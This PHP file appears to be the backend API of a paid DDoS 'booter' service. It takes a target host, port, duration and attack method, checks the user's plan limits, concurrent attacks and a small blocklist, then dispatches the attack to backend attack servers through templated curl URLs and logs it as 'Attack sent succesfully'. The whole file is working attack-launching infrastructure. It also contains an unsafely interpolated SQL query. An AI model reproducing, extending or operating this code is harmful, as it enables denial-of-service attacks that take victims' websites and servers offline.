<?php 
ob_start();
session_start();
require_once 'includes/app/config.php';
require_once 'includes/app/init.php';

	$type = $_GET['type'];

	//Get, set and validate!
	$host   = $_GET['host'];		
	$port   = intval($_GET['port']);	
	$time   = intval($_GET['time']);
	$method = $_GET['method'];
	$vip = 0;
	$key = $_GET['key'];

	// Checking if key exists
	$SQL = $odb->prepare("SELECT `ID`, `username` FROM `users` WHERE `api` = :key");
	$SQL -> execute(array(':key' => $key));
	$uid = $SQL -> fetchColumn(0);
	$SQL = $odb->prepare("SELECT `username` FROM `users` WHERE `api` = :key");
	$SQL -> execute(array(':key' => $key));
	$username = $SQL->fetchColumn(0);
			
	//Verifying all fields
	if (empty($host) || empty($time) || empty($port) || empty($method)) {
		die('Please verify all fields');
	}

	//Check if the method is legit
	if (!ctype_alnum(str_replace(' ', '', str_replace('-', '', $method)))) {
		die('Method is unavailable');
	}

	$SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
	$SQL -> execute(array(':method' => $method));
	$countMethod = $SQL -> fetchColumn(0);

	if ($countMethod == 0) {
		die('Method is unavailable');
	}

	$SQL = $odb->prepare("SELECT type FROM `methods` WHERE `name` = :method");
	$SQL -> execute(array(':method' => $method));
	$type = $SQL -> fetchColumn(0);

	//Check if the host is a valid url or IP
	$SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
	$SQL -> execute(array(':method' => $method));
	$type = $SQL -> fetchColumn(0);

			if ($type == 'layer7') {
				//if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
				//	die(error('Host is not a valid URL'));
				//}
				

				$parameters = array(".gov", ".edu", "$", "{", "%", "<");

				foreach ($parameters as $parameter) {
					if (strpos($host, $parameter)) {
						die('You are not allowed to attack these websites');
					}
				}

			} elseif (!filter_var($host, FILTER_VALIDATE_IP)) {
                die('Host is not a valid IP address');
            }

			//Check if host is blacklisted
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host");
			$SQL -> execute(array(':host' => $host));
			$countBlacklist = $SQL -> fetchColumn(0);

			if ($countBlacklist > 0) {
				die('Host is blacklisted');
			}


		//Check concurrent attacks
		if ($user->hasMembershipApi($odb, $uid)) {
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
			$SQL -> execute(array(':username' => $username));
			$countRunning = $SQL -> fetchColumn(0);
			if ($countRunning >= $stats->concurrentsApi($odb, $uid)) {
				die('You have too many boots running.');
			}
		}

		//Check max boot time
		$SQLGetTime = $odb->prepare("SELECT `plans`.`mbt`, `plans`.`vip` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
		$SQLGetTime->execute(array(':id' => $uid));
		while ($show = $SQLGetTime->fetch(PDO::FETCH_ASSOC)) {
				$maxTime = $show['mbt'];
				$userVIP  = $show['vip'];
		}

		$SQLGetMethodVip = $odb->prepare("SELECT `methods`.`vip` FROM `methods` WHERE `name` = :name");
		$SQLGetMethodVip->execute(array(':name' => $method));
		$methodVIP = $SQLGetMethodVip->fetchColumn(0);

		if (!$user->hasMembershipApi($odb, $uid) && $testboots == 1) {
			$maxTime = 60;
		}

		if ($userVIP != '1' && $methodVIP == '1') {
			die('You cannot use VIP methods with this plan.');
		}

		if ($time > $maxTime){
			die('Your max boot time has been exceeded.');
		}
		
		if($time < 1){
			die('Your attack must be over 0 seconds long');
		}

		
		// check cooldown
		
		if ($cooldown == 1) {
			die('Cooldown in progress.. please wait!');
		}
	
        //Check rotation
        $i = 0;
		
		// Checks if the attack is VIP
		if ($vip == '1') { 
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '1' AND `methods` LIKE :method ORDER BY RAND()");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
		} else { 
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '0' AND `methods` LIKE :method ORDER BY RAND()");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
		  }

        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {

            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);

            if ($count >= $show['slots']) {
                continue;
            }

            $i++;
            $arrayFind = array('[host]', '[port]', '[time]', '[method]');
            $arrayReplace = array($host, $port, $time, $method);
            $APILink = $show['api'];
			$handler[] = $show['name'];
  
            $APILink = str_replace($arrayFind, $arrayReplace, $APILink);
			
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            $result = curl_exec($ch);
            curl_close($ch);

        }

        if ($i == 0) {
            die('No open slots for your attack');
        }

		//End of attacking servers script
		$handlers     = @implode(",", $handler);

		//Insert Logs
		$chart = date("d-m");

		echo 'tada';
	

		$insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), :chart, '0', :handler, :vip)");
		$insertLogSQL -> execute(array(':user' => $username, ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':chart' => $chart, ':handler' => $handlers, ':vip' => '0'));




		
		// Gen Here
		
		
		$key = md5(microtime() . rand());
		$insertLogSQL = $odb->prepare("INSERT INTO `ping_sessions` VALUES(NULL, :ping_key, :user_id, :ping_ip, :ping_port)");
		$insertLogSQL -> execute(array(':ping_key' => $key, ':user_id' => $uid, ':ping_ip' => $host, ':ping_port' => $port));
		
		echo "Attack sent succesfully";
	
		
		

?>